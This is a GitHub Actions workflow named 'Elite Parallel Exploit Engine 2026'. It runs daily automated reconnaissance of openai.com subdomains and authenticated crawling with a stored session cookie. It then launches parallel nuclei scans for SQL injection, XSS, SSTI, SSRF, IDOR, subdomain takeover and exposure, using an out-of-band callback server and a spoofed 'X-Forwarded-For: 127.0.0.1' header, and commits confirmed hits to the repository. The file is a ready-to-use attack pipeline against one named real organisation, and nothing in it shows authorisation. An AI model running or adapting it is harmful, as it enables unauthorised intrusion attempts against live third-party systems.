name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  # RECON JOB: Gathers targets and finds new links
  recon:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Build Target Delta
        env:
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          mkdir -p output/
          [ -f output/params.txt ] && mv output/params.txt output/params_old.txt || touch output/params_old.txt
          
          # Rapid Recon with PDCP Cloud
          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > subs.txt
          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> subs.txt
          cat subs.txt | sort -u | httpx -silent -o output/alive.txt
          
          # Authenticated Crawl
          katana -list output/alive.txt -jc -kf all -d 3 -H "Cookie: $COOKIE" -o output/params_new.txt
          
          # Deduplication: Only scan what hasn't been scanned before
          grep -vFf output/params_old.txt output/params_new.txt > output/to_scan.txt || cp output/params_new.txt output/to_scan.txt
          
          # Update the master list
          cat output/params_old.txt output/to_scan.txt | sort -u > output/params.txt

      - name: Save Recon for Fuzzers
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: output/

  # FUZZ JOB: Runs 7 parallel servers at once
  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        # Each one of these runs on a DIFFERENT server at the SAME time
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets
          path: output/

      - name: Setup Nuclei
        run: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest && echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Parallel Attack Engine
        env:
          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # The -v flag ensures we only save verified hits (reduces false positives)
          nuclei -l output/to_scan.txt \
            -tags ${{ matrix.vuln_type }} \
            -auth $PDCP_API_KEY \
            -interactsh-server oast.fun \
            -itoken $ISH_TOKEN \
            -header "Cookie: $COOKIE" \
            -header "X-Forwarded-For: 127.0.0.1" \
            -rate-limit 120 \
            -o output/hit_${{ matrix.vuln_type }}.txt

      - name: Atomic Save Findings
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          git pull origin main --rebase
          git add output/
          git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)" || echo "No hits"
          git push origin main
          
